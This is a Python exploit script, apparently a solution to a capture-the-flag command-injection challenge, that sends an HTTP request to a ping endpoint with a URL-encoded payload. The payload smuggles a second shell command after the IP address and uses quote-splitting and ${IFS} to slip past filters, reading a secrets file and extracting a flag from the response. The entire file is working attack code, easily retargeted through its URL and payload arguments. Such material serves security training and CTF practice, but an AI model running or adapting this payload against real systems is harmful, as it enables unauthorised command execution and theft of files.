#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))


import argparse
import re
import sys
from urllib.parse import quote

import requests


DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33409/")
DEFAULT_PAYLOAD = "127.0.0.1;c'a't${IFS}s3cr3t_out.txt"
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}\r\n]+\}")


def build_url(base_url: str, payload: str) -> str:
    """Build final URL while preserving shell-special chars by URL encoding."""
    encoded_payload = quote(payload, safe="")
    sep = "&" if "?" in base_url else "?"
    return f"{base_url}{sep}ip={encoded_payload}"


def exploit(base_url: str, payload: str, timeout: int = 10) -> str | None:
    target = build_url(base_url, payload)
    print(f"[+] Target : {base_url}")
    print(f"[+] Payload: {payload}")
    print(f"[+] Request: {target}")

    try:
        resp = requests.get(target, timeout=timeout)
    except requests.RequestException as exc:
        print(f"[-] Request failed: {exc}", file=sys.stderr)
        return None

    print(f"[+] Status : {resp.status_code}")
    text = resp.text

    match = FLAG_RE.search(text)
    if match:
        flag = match.group(0)
        print(f"[+] Flag   : {flag}")
        return flag

    print("[-] Flag not found in response.")
    print("[+] Response preview:")
    print(text[:1000])
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit for 21-cmdi-ping-concat")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"target base URL, default: {DEFAULT_URL}")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="command injection payload")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds")
    args = parser.parse_args()

    flag = exploit(args.url, args.payload, args.timeout)
    return 0 if flag else 1


if __name__ == "__main__":
    raise SystemExit(main())
